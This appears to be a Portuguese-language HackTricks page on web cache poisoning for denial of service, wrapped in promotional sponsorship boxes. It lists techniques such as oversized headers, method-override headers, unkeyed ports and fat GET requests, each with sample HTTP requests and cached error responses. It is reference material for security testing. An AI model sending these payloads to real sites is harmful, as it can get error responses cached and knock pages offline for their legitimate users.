# Envenenamento de Cache para DoS

<details>

<summary><strong>Aprenda hacking na AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>

{% hint style="danger" %}
Nesta p√°gina, voc√™ pode encontrar diferentes varia√ß√µes para tentar fazer o **servidor web responder com erros** a solicita√ß√µes que s√£o **v√°lidas para os servidores de cache**
{% endhint %}

* **Tamanho Excessivo de Cabe√ßalho HTTP (HHO)**

Envie uma solicita√ß√£o com um tamanho de cabe√ßalho maior do que o suportado pelo servidor web, mas menor do que o suportado pelo servidor de cache. O servidor web responder√° com um c√≥digo de resposta 400 que pode ser armazenado em cache:
```
GET / HTTP/1.1
Host: redacted.com
X-Oversize-Hedear:Big-Value-000000000000000
```
* **Caractere Meta HTTP (HMC) e valores inesperados**

Envie um cabe√ßalho que contenha alguns **caracteres meta prejudiciais** como `\n` e `\r`. Para que o ataque funcione, voc√™ deve primeiro burlar o cache.
```
GET / HTTP/1.1
Host: redacted.com
X-Meta-Hedear:Bad Chars\n \r
```
Um cabe√ßalho mal configurado poderia ser apenas `\:` como um cabe√ßalho.

Isso tamb√©m poderia funcionar se valores inesperados forem enviados, como um Content-Type inesperado:
```
GET /anas/repos HTTP/2
Host: redacted.com
Content-Type: HelloWorld
```
* **Cabe√ßalho sem chave**

Alguns sites retornar√£o um c√≥digo de status de erro se **virem alguns cabe√ßalhos espec√≠ficos** na solicita√ß√£o, como o cabe√ßalho _X-Amz-Website-Location-Redirect: someThing_:
```
GET /app.js HTTP/2
Host: redacted.com
X-Amz-Website-Location-Redirect: someThing

HTTP/2 403 Forbidden
Cache: hit

Invalid Header
```
* **Ataque de Substitui√ß√£o de M√©todo HTTP (HMO)**

Se o servidor suporta a altera√ß√£o do m√©todo HTTP com cabe√ßalhos como `X-HTTP-Method-Override`, `X-HTTP-Method` ou `X-Method-Override`. √â poss√≠vel solicitar uma p√°gina v√°lida alterando o m√©todo para um que o servidor n√£o suporta, fazendo com que uma resposta ruim seja armazenada em cache:
```
GET /blogs HTTP/1.1
Host: redacted.com
HTTP-Method-Override: POST
```
* **Porta n√£o chaveada**

Se a porta no cabe√ßalho do Host for refletida na resposta e n√£o estiver inclu√≠da na chave de cache, √© poss√≠vel redirecion√°-la para uma porta n√£o utilizada:
```
GET /index.html HTTP/1.1
Host: redacted.com:1

HTTP/1.1 301 Moved Permanently
Location: https://redacted.com:1/en/index.html
Cache: miss
```
* **Long Redirect DoS**

Assim como no exemplo a seguir, x n√£o est√° sendo armazenado em cache, ent√£o um atacante poderia abusar do comportamento de resposta de redirecionamento para fazer com que o redirecionamento envie uma URL t√£o grande que retorne um erro. Em seguida, as pessoas que tentarem acessar a URL sem a chave x n√£o armazenada em cache receber√£o a resposta de erro:
```
GET /login?x=veryLongUrl HTTP/1.1
Host: www.cloudflare.com

HTTP/1.1 301 Moved Permanently
Location: /login/?x=veryLongUrl
Cache: hit

GET /login/?x=veryLongUrl HTTP/1.1
Host: www.cloudflare.com

HTTP/1.1 414 Request-URI Too Large
CF-Cache-Status: miss
```
* **Normaliza√ß√£o de mai√∫sculas e min√∫sculas no cabe√ßalho do host**

O cabe√ßalho do host deve ser insens√≠vel a mai√∫sculas e min√∫sculas, mas alguns sites esperam que ele esteja em min√∫sculas, retornando um erro se n√£o estiver:
```
GET /img.png HTTP/1.1
Host: Cdn.redacted.com

HTTP/1.1 404 Not Found
Cache:miss

Not Found
```
* **Normaliza√ß√£o de caminho**

Algumas p√°ginas retornar√£o c√≥digos de erro enviando dados URLencode no caminho, no entanto, o servidor de cache far√° o URLdecode do caminho e armazenar√° a resposta para o caminho URLdecoded:
```
GET /api/v1%2e1/user HTTP/1.1
Host: redacted.com


HTTP/1.1 404 Not Found
Cach:miss

Not Found
```
* **Fat Get**

Alguns servidores de cache, como o Cloudflare, ou servidores web, param solicita√ß√µes GET com um corpo, ent√£o isso poderia ser abusado para armazenar em cache uma resposta inv√°lida:
```
GET /index.html HTTP/2
Host: redacted.com
Content-Length: 3

xyz


HTTP/2 403 Forbidden
Cache: hit
```
## Refer√™ncias

* [https://anasbetis023.medium.com/dont-trust-the-cache-exposing-web-cache-poisoning-and-deception-vulnerabilities-3a829f221f52](https://anasbetis023.medium.com/dont-trust-the-cache-exposing-web-cache-poisoning-and-deception-vulnerabilities-3a829f221f52)
* [https://youst.in/posts/cache-poisoning-at-scale/?source=post\_page-----3a829f221f52--------------------------------](https://youst.in/posts/cache-poisoning-at-scale/?source=post\_page-----3a829f221f52--------------------------------)

<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>
